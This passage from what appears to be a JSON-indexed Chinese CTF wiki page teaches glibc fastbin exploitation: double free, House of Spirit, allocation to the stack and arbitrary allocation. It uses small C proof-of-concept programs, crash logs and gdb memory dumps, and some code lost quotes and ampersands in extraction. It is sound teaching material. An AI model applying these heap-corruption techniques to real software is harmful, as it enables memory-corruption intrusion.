            "text": "Fastbin Double Free \u662f\u6307 fastbin \u7684 chunk \u53ef\u4ee5\u88ab\u591a\u6b21\u91ca\u653e\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728 fastbin \u94fe\u8868\u4e2d\u5b58\u5728\u591a\u6b21\u3002\u8fd9\u6837\u5bfc\u81f4\u7684\u540e\u679c\u662f\u591a\u6b21\u5206\u914d\u53ef\u4ee5\u4ece fastbin \u94fe\u8868\u4e2d\u53d6\u51fa\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u76f8\u5f53\u4e8e\u591a\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u7ed3\u5408\u5806\u5757\u7684\u6570\u636e\u5185\u5bb9\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6(type confused)\u7684\u6548\u679c\u3002  Fastbin Double Free \u80fd\u591f\u6210\u529f\u5229\u7528\u4e3b\u8981\u6709\u4e24\u90e8\u5206\u7684\u539f\u56e0   fastbin \u7684\u5806\u5757\u88ab\u91ca\u653e\u540e next_chunk \u7684 pre_inuse \u4f4d\u4e0d\u4f1a\u88ab\u6e05\u7a7a  fastbin \u5728\u6267\u884c free \u7684\u65f6\u5019\u4ec5\u9a8c\u8bc1\u4e86 main_arena \u76f4\u63a5\u6307\u5411\u7684\u5757\uff0c\u5373\u94fe\u8868\u6307\u9488\u5934\u90e8\u7684\u5757\u3002\u5bf9\u4e8e\u94fe\u8868\u540e\u9762\u7684\u5757\uff0c\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002   /* Another simple check: make sure the top of the bin is not the\n       record we are going to add (i.e., double free).  */\n    if (__builtin_expect (old == p, 0))\n      {\n        errstr =  double free or corruption (fasttop) ;\n        goto errout;\n}", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_4", 
            "text": "\u4e0b\u9762\u7684\u793a\u4f8b\u7a0b\u5e8f\u8bf4\u660e\u4e86\u8fd9\u4e00\u70b9\uff0c\u5f53\u6211\u4eec\u8bd5\u56fe\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801\u65f6  int main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    chunk1=malloc(0x10);\n    chunk2=malloc(0x10);\n\n    free(chunk1);\n    free(chunk1);\n    return 0;\n} \n\u5982\u679c\u4f60\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u4e0d\u51fa\u610f\u5916\u7684\u8bdd\u4f1a\u5f97\u5230\u5982\u4e0b\u7684\u7ed3\u679c\uff0c\u8fd9\u6b63\u662f _int_free \u51fd\u6570\u68c0\u6d4b\u5230\u4e86 fastbin \u7684 double free\u3002 *** Error in `./tst : double free or corruption (fasttop): 0x0000000002200010 ***\n======= Backtrace: =========\n/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]\n/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a]\n/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c]\n./tst[0x4005a2]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]\n./tst[0x400499]\n======= Memory map: ========\n00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst\n02200000-02221000 rw-p 00000000 00:00 0                                  [heap]\n7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0 \n7fbb74021000-7fbb78000000 ---p 00000000 00:00 0 \n7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0 \n7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0 \n7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0 \n7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0 \n7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]\n7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]\n7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8) \n\u5982\u679c\u6211\u4eec\u5728 chunk1 \u91ca\u653e\u540e\uff0c\u518d\u91ca\u653e chunk2 \uff0c\u8fd9\u6837 main_arena \u5c31\u6307\u5411 chunk2 \u800c\u4e0d\u662f chunk1 \u4e86\uff0c\u6b64\u65f6\u6211\u4eec\u518d\u53bb\u91ca\u653e chunk1 \u5c31\u4e0d\u518d\u4f1a\u88ab\u68c0\u6d4b\u5230\u3002 int main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    chunk1=malloc(0x10);\n    chunk2=malloc(0x10);\n\n    free(chunk1);\n    free(chunk2);\n    free(chunk1);\n    return 0;\n} \n\u7b2c\u4e00\u6b21\u91ca\u653e free(chunk1)   \u7b2c\u4e8c\u6b21\u91ca\u653e free(chunk2)   \u7b2c\u4e09\u6b21\u91ca\u653e free(chunk1)   \u6ce8\u610f\u56e0\u4e3a chunk1 \u88ab\u518d\u6b21\u91ca\u653e\u56e0\u6b64\u5176 fd \u503c\u4e0d\u518d\u4e3a 0 \u800c\u662f\u6307\u5411 chunk2\uff0c\u8fd9\u65f6\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 chunk1 \u7684\u5185\u5bb9\uff0c\u4fbf\u53ef\u4ee5\u5199\u5165\u5176 fd \u6307\u9488\u4ece\u800c\u5b9e\u73b0\u5728\u6211\u4eec\u60f3\u8981\u7684\u4efb\u610f\u5730\u5740\u5206\u914d fastbin \u5757\u3002\n\u4e0b\u9762\u8fd9\u4e2a\u793a\u4f8b\u6f14\u793a\u4e86\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u8ddf\u524d\u9762\u4e00\u6837\u6784\u9020 main_arena= chunk1= chun2= chunk1\u7684\u94fe\u8868\u3002\u4e4b\u540e\u7b2c\u4e00\u6b21\u8c03\u7528 malloc \u8fd4\u56de chunk1 \u4e4b\u540e\u4fee\u6539 chunk1 \u7684 fd \u6307\u9488\u6307\u5411 bss \u6bb5\u4e0a\u7684 bss_chunk\uff0c\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u770b\u5230 fastbin \u4f1a\u628a\u5806\u5757\u5206\u914d\u5230\u8fd9\u91cc\u3002  typedef struct _chunk\n{\n    long long pre_size;\n    long long size;\n    long long fd;\n    long long bk;  \n} CHUNK,*PCHUNK;\n\nCHUNK bss_chunk;\n\nint main(void)\n{\n    void *chunk1,*chunk2,*chunk3;\n    void *chunk_a,*chunk_b;\n\n    bss_chunk.size=0x21;\n    chunk1=malloc(0x10);\n    chunk2=malloc(0x10);\n\n    free(chunk1);\n    free(chunk2);\n    free(chunk1);\n\n    chunk_a=malloc(0x10);\n    *(long long *)chunk_a= bss_chunk;\n    malloc(0x10);\n    malloc(0x10);\n    chunk_b=malloc(0x10);\n    printf( %p ,chunk_b);\n    return 0;\n} \n\u5728\u6211\u7684\u7cfb\u7edf\u4e0a chunk_b \u8f93\u51fa\u7684\u503c\u4f1a\u662f 0x601090\uff0c\u8fd9\u4e2a\u503c\u4f4d\u4e8ebss\u6bb5\u4e2d\u6b63\u662f\u6211\u4eec\u4e4b\u524d\u8bbe\u7f6e\u7684 CHUNK bss_chunk  Start              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n\n0x601080  bss_chunk :   0x0000000000000000  0x0000000000000021\n0x601090  bss_chunk+16 :0x0000000000000000  0x0000000000000000\n0x6010a0:               0x0000000000000000  0x0000000000000000\n0x6010b0:               0x0000000000000000  0x0000000000000000\n0x6010c0:               0x0000000000000000  0x0000000000000000 \n\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728 main \u51fd\u6570\u7684\u7b2c\u4e00\u6b65\u5c31\u8fdb\u884c\u4e86 bss_chunk.size=0x21; \u7684\u64cd\u4f5c\uff0c\u8fd9\u662f\u56e0\u4e3a_int_malloc\u4f1a\u5bf9\u6b32\u5206\u914d\u4f4d\u7f6e\u7684 size \u57df\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5982\u679c\u5176 size \u4e0e\u5f53\u524d fastbin \u94fe\u8868\u5e94\u6709 size \u4e0d\u7b26\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\u3002 *** Error in `./tst : malloc(): memory corruption (fast): 0x0000000000601090 ***\n======= Backtrace: =========\n/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]\n/lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]\n./tst[0x400636]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]\n./tst[0x4004e9]\n======= Memory map: ========\n00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst\n00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst\n00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]\n7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0 \n7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0 \n7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0 \n7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0 \n7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0 \n7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0 \n7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]\n7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]\n7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\u5df2\u653e\u5f03 (\u6838\u5fc3\u5df2\u8f6c\u50a8) \n_int_malloc \u4e2d\u7684\u6821\u9a8c\u5982\u4e0b if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))\n    {\n      errstr =  malloc(): memory corruption (fast) ;\n    errout:\n      malloc_printerr (check_action, errstr, chunk2mem (victim));\n      return NULL;\n}", 
            "title": "\u6f14\u793a"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_5", 
            "text": "\u901a\u8fc7 fastbin double free \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2a\u6307\u9488\u63a7\u5236\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u8fd9\u53ef\u4ee5\u7528\u4e8e\u7be1\u6539\u4e00\u4e9b\u5806\u5757\u4e2d\u7684\u5173\u952e\u6570\u636e\u57df\u6216\u8005\u662f\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6\u7684\u6548\u679c\u3002\n\u5982\u679c\u66f4\u8fdb\u4e00\u6b65\u4fee\u6539 fd \u6307\u9488\uff0c\u5219\u80fd\u591f\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d\u5806\u5757\u7684\u6548\u679c( \u9996\u5148\u8981\u901a\u8fc7\u9a8c\u8bc1 )\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u7684\u6548\u679c\u3002", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#house-of-spirit", 
            "text": "", 
            "title": "House Of Spirit"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_6", 
            "text": "House of Spirit \u662f  the Malloc Maleficarum  \u4e2d\u7684\u4e00\u79cd\u6280\u672f\u3002  \u8be5\u6280\u672f\u7684\u6838\u5fc3\u5728\u4e8e\u5728\u76ee\u6807\u4f4d\u7f6e\u5904\u4f2a\u9020 fastbin chunk\uff0c\u5e76\u5c06\u5176\u91ca\u653e\uff0c\u4ece\u800c\u8fbe\u5230\u5206\u914d \u6307\u5b9a\u5730\u5740 \u7684 chunk \u7684\u76ee\u7684\u3002  \u8981\u60f3\u6784\u9020 fastbin fake chunk\uff0c\u5e76\u4e14\u5c06\u5176\u91ca\u653e\u65f6\uff0c\u53ef\u4ee5\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u4e2d\uff0c\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9b\u5fc5\u8981\u7684\u68c0\u6d4b\uff0c\u5373   fake chunk \u7684 ISMMAP \u4f4d\u4e0d\u80fd\u4e3a1\uff0c\u56e0\u4e3a free \u65f6\uff0c\u5982\u679c\u662f mmap \u7684 chunk\uff0c\u4f1a\u5355\u72ec\u5904\u7406\u3002  fake chunk \u5730\u5740\u9700\u8981\u5bf9\u9f50\uff0c MALLOC_ALIGN_MASK  fake chunk \u7684 size \u5927\u5c0f\u9700\u8981\u6ee1\u8db3\u5bf9\u5e94\u7684 fastbin \u7684\u9700\u6c42\uff0c\u540c\u65f6\u4e5f\u5f97\u5bf9\u9f50\u3002  fake chunk \u7684 next chunk \u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e  2 * SIZE_SZ \uff0c\u540c\u65f6\u4e5f\u4e0d\u80fd\u5927\u4e8e av- system_mem  \u3002  fake chunk \u5bf9\u5e94\u7684 fastbin \u94fe\u8868\u5934\u90e8\u4e0d\u80fd\u662f\u8be5 fake chunk\uff0c\u5373\u4e0d\u80fd\u6784\u6210 double free \u7684\u60c5\u51b5\u3002   \u81f3\u4e8e\u4e3a\u4ec0\u4e48\u8981\u7ed5\u8fc7\u8fd9\u4e9b\u68c0\u6d4b\uff0c\u53ef\u4ee5\u53c2\u8003 free \u90e8\u5206\u7684\u6e90\u7801\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_7", 
            "text": "\u8fd9\u91cc\u5c31\u76f4\u63a5\u4ee5 how2heap \u4e0a\u7684\u4f8b\u5b50\u8fdb\u884c\u8bf4\u660e\uff0c\u5982\u4e0b  #include   stdio.h  #include   stdlib.h  int   main ()  { \n     fprintf ( stderr ,   This file demonstrates the house of spirit attack. \\n ); \n\n     fprintf ( stderr ,   Calling malloc() once so that it sets up its memory. \\n ); \n     malloc ( 1 ); \n\n     fprintf ( stderr ,   We will now overwrite a pointer to point to a fake  fastbin  region. \\n ); \n     unsigned   long   long   * a ; \n     // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) \n     unsigned   long   long   fake_chunks [ 10 ]   __attribute__   (( aligned   ( 16 ))); \n\n     fprintf ( stderr ,   This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p. \\n ,   sizeof ( fake_chunks ),   fake_chunks [ 1 ],   fake_chunks [ 7 ]); \n\n     fprintf ( stderr ,   This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category ( = 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems. \\n ); \n     fprintf ( stderr ,   ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.  \\n ); \n     fake_chunks [ 1 ]   =   0x40 ;   // this is the size \n\n     fprintf ( stderr ,   The chunk.size of the *next* fake region has to be sane. That is   2*SIZE_SZ (  16 on x64)     av- system_mem (  128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size. \\n ); \n         // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 \n     fake_chunks [ 9 ]   =   0x1234 ;   // nextsize \n\n     fprintf ( stderr ,   Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p. \\n ,   fake_chunks [ 1 ]); \n     fprintf ( stderr ,   ... note that the memory address of the *region* associated with this chunk must be 16-byte aligned. \\n ); \n     a   =   fake_chunks [ 2 ]; \n\n     fprintf ( stderr ,   Freeing the overwritten pointer. \\n ); \n     free ( a ); \n\n     fprintf ( stderr ,   Now the next malloc will return the region of our fake chunk at %p, which will be %p! \\n ,   fake_chunks [ 1 ],   fake_chunks [ 2 ]); \n     fprintf ( stderr ,   malloc(0x30): %p \\n ,   malloc ( 0x30 ));  }   \u8fd0\u884c\u540e\u7684\u6548\u679c\u5982\u4e0b  \u279c  how2heap git: ( master )  ./house_of_spirit \nThis file demonstrates the house of spirit attack.\nCalling malloc ()  once so that it sets up its memory.\nWe will now overwrite a pointer to point to a fake  fastbin  region.\nThis region  ( memory of length:  80 )  contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.\nThis chunk.size of this region has to be  16  more than the region  ( to accomodate the chunk data )   while  still falling into the fastbin category  ( =   128  on x64 ) . The PREV_INUSE  ( lsb )  bit is ignored by free  for  fastbin-sized chunks, however the IS_MMAPPED  ( second lsb )  and NON_MAIN_ARENA  ( third lsb )  bits cause problems.\n... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work  for  the malloc parameter at the end. \nThe chunk.size of the *next* fake region has to be sane. That is    2 *SIZE_SZ  (   16  on x64 )      av- system_mem  (  128kb by default  for  the main arena )  to pass the nextsize integrity checks. No need  for  fastbin size.\nNow we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.\n... note that the memory address of the *region* associated with this chunk must be  16 -byte aligned.\nFreeing the overwritten pointer.\nNow the next malloc will  return  the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!\nmalloc ( 0x30 ) : 0x7ffd9bceaa60", 
            "title": "\u6f14\u793a"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_8", 
            "text": "\u53ef\u4ee5\u770b\u51fa\uff0c\u60f3\u8981\u4f7f\u7528\u8be5\u6280\u672f\u5206\u914d chunk \u5230\u6307\u5b9a\u5730\u5740\uff0c\u5176\u5b9e\u5e76\u4e0d\u9700\u8981\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u4efb\u4f55\u5185\u5bb9\uff0c \u5173\u952e\u662f\u8981\u80fd\u591f\u4fee\u6539\u6307\u5b9a\u5730\u5740\u7684\u524d\u540e\u7684\u5185\u5bb9\u4f7f\u5176\u53ef\u4ee5\u7ed5\u8fc7\u5bf9\u5e94\u7684\u68c0\u6d4b \u3002", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#alloc-to-stack", 
            "text": "", 
            "title": "Alloc to Stack"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_9", 
            "text": "\u5982\u679c\u4f60\u5df2\u7ecf\u7406\u89e3\u4e86\u524d\u6587\u6240\u8bb2\u7684 Fastbin Double Free \u4e0e house of spirit \u6280\u672f\uff0c\u90a3\u4e48\u7406\u89e3\u8be5\u6280\u672f\u5c31\u5df2\u7ecf\u4e0d\u6210\u95ee\u9898\u4e86\uff0c\u5b83\u4eec\u7684\u672c\u8d28\u90fd\u5728\u4e8e fastbin \u94fe\u8868\u7684\u7279\u6027\uff1a\u5f53\u524d chunk \u7684 fd \u6307\u9488\u6307\u5411\u4e0b\u4e00\u4e2a chunk\u3002  \u8be5\u6280\u672f\u7684\u6838\u5fc3\u70b9\u5728\u4e8e\u52ab\u6301 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u6307\u9488\uff0c\u628a fd \u6307\u9488\u6307\u5411\u6211\u4eec\u60f3\u8981\u5206\u914d\u7684\u6808\u4e0a\uff0c\u4ece\u800c\u5b9e\u73b0\u63a7\u5236\u6808\u4e2d\u7684\u4e00\u4e9b\u5173\u952e\u6570\u636e\uff0c\u6bd4\u5982\u8fd4\u56de\u5730\u5740\u7b49\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_10", 
            "text": "\u8fd9\u6b21\u6211\u4eec\u628a fake_chunk \u7f6e\u4e8e\u6808\u4e2d\u79f0\u4e3a stack_chunk\uff0c\u540c\u65f6\u52ab\u6301\u4e86 fastbin \u94fe\u8868\u4e2d chunk \u7684 fd \u503c\uff0c\u901a\u8fc7\u628a\u8fd9\u4e2a fd \u503c\u6307\u5411 stack_chunk \u5c31\u53ef\u4ee5\u5b9e\u73b0\u5728\u6808\u4e2d\u5206\u914d fastbin chunk\u3002 typedef struct _chunk\n{\n    long long pre_size;\n    long long size;\n    long long fd;\n    long long bk;  \n} CHUNK,*PCHUNK;\n\nint main(void)\n{\n    CHUNK stack_chunk;\n\n    void *chunk1;\n    void *chunk_a;\n\n    stack_chunk.size=0x21;\n    chunk1=malloc(0x10);\n\n    free(chunk1);\n\n    *(long long *)chunk1= stack_chunk;\n    malloc(0x10);\n    chunk_a=malloc(0x10);\n    return 0;\n} \n\u901a\u8fc7 gdb \u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u9996\u5148\u628a chunk1 \u7684 fd \u6307\u9488\u6307\u5411\u4e86 stack_chunk 0x602000:   0x0000000000000000  0x0000000000000021  === chunk1\n0x602010:   0x00007fffffffde60  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1  === top chunk \n\u4e4b\u540e\u7b2c\u4e00\u6b21 malloc \u4f7f\u5f97 fastbin \u94fe\u8868\u6307\u5411\u4e86 stack_chunk\uff0c\u8fd9\u610f\u5473\u7740\u4e0b\u4e00\u6b21\u5206\u914d\u4f1a\u4f7f\u7528 stack_chunk \u7684\u5185\u5b58\u8fdb\u884c 0x7ffff7dd1b20  main_arena :    0x0000000000000000  === unsorted bin\n0x7ffff7dd1b28  main_arena+8 :  0x00007fffffffde60  === fastbin[0]\n0x7ffff7dd1b30  main_arena+16 : 0x0000000000000000   \n\u6700\u7ec8\u7b2c\u4e8c\u6b21malloc\u8fd4\u56de\u503c\u4e3a0x00007fffffffde70\u4e5f\u5c31\u662fstack_chunk    0x400629  main+83         call   0x4004c0  malloc@plt \n \u2192 0x40062e  main+88         mov    QWORD PTR [rbp-0x38], rax\n   $rax   : 0x00007fffffffde70\n\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- \n0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- \n0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- \n0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]\n0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]\n0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- \n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]", 
            "title": "\u6f14\u793a"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_11", 
            "text": "\u901a\u8fc7\u8be5\u6280\u672f\u6211\u4eec\u53ef\u4ee5\u628a fastbin chunk \u5206\u914d\u5230\u6808\u4e2d\uff0c\u4ece\u800c\u63a7\u5236\u8fd4\u56de\u5730\u5740\u7b49\u5173\u952e\u6570\u636e\u3002\u8981\u5b9e\u73b0\u8fd9\u4e00\u70b9\u6211\u4eec\u9700\u8981\u52ab\u6301fastbin \u4e2d chunk \u7684 fd \u57df\uff0c\u628a\u5b83\u6307\u5230\u6808\u4e0a\uff0c\u5f53\u7136\u540c\u65f6\u9700\u8981\u6808\u4e0a\u5b58\u5728\u6709\u6ee1\u8db3\u6761\u4ef6\u7684size\u503c\u3002", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#arbitrary-alloc", 
            "text": "", 
            "title": "Arbitrary Alloc"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_12", 
            "text": "Arbitrary Alloc \u5176\u5b9e\u4e0e Alloc to stack \u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u552f\u4e00\u7684\u533a\u522b\u662f\u5206\u914d\u7684\u76ee\u6807\u4e0d\u518d\u662f\u6808\u4e2d\u3002\n\u4e8b\u5b9e\u4e0a\u53ea\u8981\u6ee1\u8db3\u76ee\u6807\u5730\u5740\u5b58\u5728\u5408\u6cd5\u7684 size \u57df\uff08\u8fd9\u4e2a size \u57df\u662f\u6784\u9020\u7684\uff0c\u8fd8\u662f\u81ea\u7136\u5b58\u5728\u7684\u90fd\u65e0\u59a8\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u628a chunk \u5206\u914d\u5230\u4efb\u610f\u7684\u53ef\u5199\u5185\u5b58\u4e2d\uff0c\u6bd4\u5982bss\u3001heap\u3001data\u3001stack\u7b49\u7b49\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/fastbin_attack/#_13", 
